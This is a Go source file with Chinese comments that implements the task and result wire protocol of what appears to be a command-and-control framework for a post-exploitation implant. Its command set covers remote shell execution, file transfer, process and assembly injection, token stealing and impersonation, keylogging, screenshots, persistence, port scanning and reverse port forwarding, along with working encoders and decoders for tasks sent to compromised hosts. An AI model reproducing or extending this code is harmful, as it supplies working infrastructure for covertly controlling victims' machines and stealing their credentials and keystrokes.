// csdev :: proto/task.go  --  协议 v2 任务与结果结构 (docs/protocol_v2.md 第 4 节)
//
// TASK (4.1):
//
//	偏移 长度 字段
//	0    4    task_id
//	4    1    cmd_class
//	5    2    alias_len
//	7    n    alias
//	7+n  4    arg_len
//	11+n m    arg
//
// TASK_BATCH (4.2): [4B count] count × [4B task_len][task 字节]
// RESULT    (4.3): [4B task_id][1B status][4B out_len][out]
package proto

import "fmt"

// cmd_class 枚举 (协议 4.1)。
const (
	CmdExecShell   byte = 0x01 // shell 命令行
	CmdFileDL      byte = 0x02 // 待下载的远端路径
	CmdFileUP      byte = 0x03 // [2B path_len][path][4B total][4B offset][bytes]
	CmdProcList    byte = 0x04 // 空
	CmdExit        byte = 0x05 // 空
	CmdSetSleep    byte = 0x06 // [4B sleep_ms][1B jitter]
	CmdInjProc     byte = 0x07 // TLV 子结构 0x3001..0x3004
	CmdInjBOF      byte = 0x08 // TLV 子结构 0x3005..0x3007
	CmdInjAssembly byte = 0x09 // TLV 子结构 0x3008..0x3009
	CmdToken       byte = 0x0A // [1B op][op 相关]
	CmdProxy       byte = 0x0B // [4B chan_id][1B op][op 相关]
	CmdKeylog      byte = 0x0C // [1B 0=stop,1=start]
	CmdScreenshot  byte = 0x0D // 空
	CmdPersist     byte = 0x0E // [1B mode][target]
	CmdPSList      byte = 0x0F // 空 (增强进程列表)
	CmdFSOps       byte = 0x10 // [1B op][路径]
	CmdNetOps      byte = 0x11 // [1B op][参数]
	CmdPortscan    byte = 0x12 // [2B hosts_len][hosts][2B ports_len][ports][1B method]
	CmdRPortFwd    byte = 0x13 // [1B op][2B bind][2B target]
	CmdCustom      byte = 0x7F // 插件扩展
)

// RESULT.status 取值 (协议 4.3)。
const (
	StatusOK      byte = 0 // 完成
	StatusErr     byte = 1 // 失败
	StatusPartial byte = 2 // 分块中, 后续还有
	StatusBusy    byte = 3 // 忙
)

// TOKEN 任务的 op 取值 (协议 4.1 0x0A)。
const (
	TokenOpSteal       byte = 1
	TokenOpMake        byte = 2
	TokenOpRev2Self    byte = 3
	TokenOpGetUID      byte = 4
	TokenOpGetPrivs    byte = 5
	TokenOpImpersonate byte = 6
)

// PROXY 任务的 op 取值 (协议 4.1 0x0B)。
const (
	ProxyOpOpen  byte = 1
	ProxyOpData  byte = 2
	ProxyOpClose byte = 3
)

// cmdClassNames 类别名, 用于日志与结果标注。
var cmdClassNames = map[byte]string{
	CmdExecShell:   "EXEC_SHELL",
	CmdFileDL:      "FILE_DL",
	CmdFileUP:      "FILE_UP",
	CmdProcList:    "PROC_LIST",
	CmdExit:        "EXIT",
	CmdSetSleep:    "SET_SLEEP",
	CmdInjProc:     "INJ_PROC",
	CmdInjBOF:      "INJ_BOF",
	CmdInjAssembly: "INJ_ASSEMBLY",
	CmdToken:       "TOKEN",
	CmdProxy:       "PROXY",
	CmdKeylog:      "KEYLOG",
	CmdScreenshot:  "SCREENSHOT",
	CmdPersist:     "PERSIST",
	CmdPSList:      "PS_LIST",
	CmdFSOps:       "FS_OPS",
	CmdNetOps:      "NET_OPS",
	CmdPortscan:    "PORTSCAN",
	CmdRPortFwd:    "RPORTFWD",
	CmdCustom:      "CUSTOM",
}

// CmdClassName 返回 cmd_class 的可读名, 未知值返回 "class-0xNN"。
func CmdClassName(class byte) string {
	if n, ok := cmdClassNames[class]; ok {
		return n
	}
	return fmt.Sprintf("class-0x%02X", class)
}

// StatusName 返回 RESULT.status 的可读名。
func StatusName(status byte) string {
	switch status {
	case StatusOK:
		return "OK"
	case StatusErr:
		return "ERR"
	case StatusPartial:
		return "PARTIAL"
	case StatusBusy:
		return "BUSY"
	default:
		return fmt.Sprintf("status-%d", status)
	}
}

// Task 一条下行任务 (协议 4.1)。
type Task struct {
	ID    uint32 // 服务端分配, 单调递增
	Class byte   // cmd_class
	Alias string // ASCII 命令名, 用于日志与结果标注
	Arg   []byte // 类别相关
}

// Encode 编码 TASK。alias 超过 65535 字节时截断到 65535。
func (t *Task) Encode() []byte {
	if t == nil {
		return nil
	}
	alias := t.Alias
	if len(alias) > MaxTLVData {
		alias = alias[:MaxTLVData]
	}
	arg := t.Arg

	out := make([]byte, 11+len(alias)+len(arg))
	PutBE32(out[0:4], t.ID)
	out[4] = t.Class
	PutBE16(out[5:7], uint16(len(alias)))
	copy(out[7:], alias)
	PutBE32(out[7+len(alias):11+len(alias)], uint32(len(arg)))
	copy(out[11+len(alias):], arg)
	return out
}

// String 便于日志输出。
func (t *Task) String() string {
	if t == nil {
		return "<nil task>"
	}
	return fmt.Sprintf("task{id=%d class=%s alias=%q arg=%d}",
		t.ID, CmdClassName(t.Class), t.Alias, len(t.Arg))
}

// Decode 把字节流解析到接收者; 失败时接收者保持不变。
func (t *Task) Decode(b []byte) error {
	got, err := DecodeTask(b)
	if err != nil {
		return err
	}
	*t = *got
	return nil
}

// DecodeTask 解析 TASK。任何截断都返回 error。
func DecodeTask(b []byte) (*Task, error) {
	if len(b) < 11 {
		return nil, fmt.Errorf("%w: TASK 固定头需要 11 字节, 实际 %d", ErrTruncated, len(b))
	}
	aliasLen := int(BE16(b[5:7]))
	if 7+aliasLen > len(b) {
		return nil, fmt.Errorf("%w: TASK alias 声明 %d 字节, 偏移 7 处仅剩 %d",
			ErrTruncated, aliasLen, len(b)-7)
	}
	argOff := 7 + aliasLen
	if argOff+4 > len(b) {
		return nil, fmt.Errorf("%w: TASK arg_len 字段越界 (偏移 %d, 已用 %d)", ErrTruncated, argOff, len(b))
	}
	argLen := int(BE32(b[argOff : argOff+4]))
	argOff += 4
	if argOff+argLen > len(b) {
		return nil, fmt.Errorf("%w: TASK arg 声明 %d 字节, 偏移 %d 处仅剩 %d",
			ErrTruncated, argLen, argOff, len(b)-argOff)
	}
	return &Task{
		ID:    BE32(b[0:4]),
		Class: b[4],
		Alias: string(b[7 : 7+aliasLen]),
		Arg:   append([]byte(nil), b[argOff:argOff+argLen]...),
	}, nil
}

// Result 一条上行结果 (协议 4.3)。
type Result struct {
	TaskID uint32
	Status byte
	Out    []byte
}

// Encode 编码 RESULT。
func (r *Result) Encode() []byte {
	if r == nil {
		return nil
	}
	out := make([]byte, 9+len(r.Out))
	PutBE32(out[0:4], r.TaskID)
	out[4] = r.Status
	PutBE32(out[5:9], uint32(len(r.Out)))
	copy(out[9:], r.Out)
	return out
}

// String 便于日志输出。
func (r *Result) String() string {
	if r == nil {
		return "<nil result>"
	}
	return fmt.Sprintf("result{task=%d status=%s out=%d}",
		r.TaskID, StatusName(r.Status), len(r.Out))
}

// Decode 把字节流解析到接收者; 失败时接收者保持不变。
func (r *Result) Decode(b []byte) error {
	got, err := DecodeResult(b)
	if err != nil {
		return err
	}
	*r = *got
	return nil
}

// DecodeResult 解析 RESULT。任何截断都返回 error。
func DecodeResult(b []byte) (*Result, error) {
	if len(b) < 9 {
		return nil, fmt.Errorf("%w: RESULT 固定头需要 9 字节, 实际 %d", ErrTruncated, len(b))
	}
	outLen := int(BE32(b[5:9]))
	if 9+outLen > len(b) {
		return nil, fmt.Errorf("%w: RESULT out 声明 %d 字节, 偏移 9 处仅剩 %d",
			ErrTruncated, outLen, len(b)-9)
	}
	return &Result{
		TaskID: BE32(b[0:4]),
		Status: b[4],
		Out:    append([]byte(nil), b[9:9+outLen]...),
	}, nil
}

// Batch 下行任务批次 (协议 4.2)。
type Batch struct {
	Tasks []Task
}

// Encode 编码 TASK_BATCH: [4B count] count × [4B task_len][task]。
func (b *Batch) Encode() []byte {
	if b == nil || len(b.Tasks) == 0 {
		out := make([]byte, 4)
		return out // 空批次: count = 0 (协议 2.4 无任务时的应答)
	}

	encoded := make([][]byte, len(b.Tasks))
	total := 4
	for i := range b.Tasks {
		encoded[i] = b.Tasks[i].Encode()
		total += 4 + len(encoded[i])
	}

	out := make([]byte, 0, total)
	out = appendBE32(out, uint32(len(b.Tasks)))
	for _, e := range encoded {
		out = appendBE32(out, uint32(len(e)))
		out = append(out, e...)
	}
	return out
}

// String 便于日志输出。
func (b *Batch) String() string {
	if b == nil {
		return "<nil batch>"
	}
	return fmt.Sprintf("batch{%d 条任务}", len(b.Tasks))
}

// Decode 把字节流解析到接收者; 失败时接收者保持不变。
func (b *Batch) Decode(raw []byte) error {
	got, err := DecodeBatch(raw)
	if err != nil {
		return err
	}
	*b = *got
	return nil
}

// DecodeBatch 解析 TASK_BATCH。count 与实际数据不符时返回 error
// (不按 count 预分配, 避免恶意 count 触发内存放大)。
func DecodeBatch(b []byte) (*Batch, error) {
	if len(b) < 4 {
		return nil, fmt.Errorf("%w: TASK_BATCH 需要 4 字节 count, 实际 %d", ErrTruncated, len(b))
	}
	count := BE32(b[0:4])
	out := &Batch{Tasks: make([]Task, 0, min(int(count), 16))}

	off := 4
	for i := uint32(0); i < count; i++ {
		if off+4 > len(b) {
			return nil, fmt.Errorf("%w: 第 %d/%d 条任务的 task_len 越界 (偏移 %d)",
				ErrTruncated, i+1, count, off)
		}
		tl := int(BE32(b[off : off+4]))
		off += 4
		if off+tl > len(b) {
			return nil, fmt.Errorf("%w: 第 %d/%d 条任务声明 %d 字节, 偏移 %d 处仅剩 %d",
				ErrTruncated, i+1, count, tl, off, len(b)-off)
		}
		t, err := DecodeTask(b[off : off+tl])
		if err != nil {
			return nil, fmt.Errorf("第 %d/%d 条任务解析失败: %w", i+1, count, err)
		}
		out.Tasks = append(out.Tasks, *t)
		off += tl
	}
	return out, nil
}

// ---------------------------------------------------------------- arg 构造辅助

// TaskArgShell 构造 EXEC_SHELL 的 arg (即命令行的原始字节)。
func TaskArgShell(cmdline string) []byte {
	return []byte(cmdline)
}

// TaskArgFileUp 构造 FILE_UP 的 arg: [2B path_len][path][4B total][4B offset][bytes]。
// path 超过 65535 字节时截断。
func TaskArgFileUp(path string, total, offset uint32, data []byte) []byte {
	p := clamp16([]byte(path))
	out := make([]byte, 2+len(p)+8+len(data))
	PutBE16(out[0:2], uint16(len(p)))
	copy(out[2:], p)
	PutBE32(out[2+len(p):6+len(p)], total)
	PutBE32(out[6+len(p):10+len(p)], offset)
	copy(out[10+len(p):], data)
	return out
}

// TaskArgSetSleep 构造 SET_SLEEP 的 arg: [4B sleep_ms][1B jitter]。
func TaskArgSetSleep(sleepMs uint32, jitterPct byte) []byte {
	out := make([]byte, 5)
	PutBE32(out[0:4], sleepMs)
	out[4] = jitterPct
	return out
}

// TaskArgToken 构造 TOKEN 的 arg: [1B op][op 相关]。extra 对应各 op 的剩余字段。
func TaskArgToken(op byte, extra []byte) []byte {
	out := make([]byte, 1+len(extra))
	out[0] = op
	copy(out[1:], extra)
	return out
}

// TaskArgProxy 构造 PROXY 的 arg: [4B chan_id][1B op][op 相关]。
func TaskArgProxy(chanID uint32, op byte, extra []byte) []byte {
	out := make([]byte, 5+len(extra))
	PutBE32(out[0:4], chanID)
	out[4] = op
	copy(out[5:], extra)
	return out
}
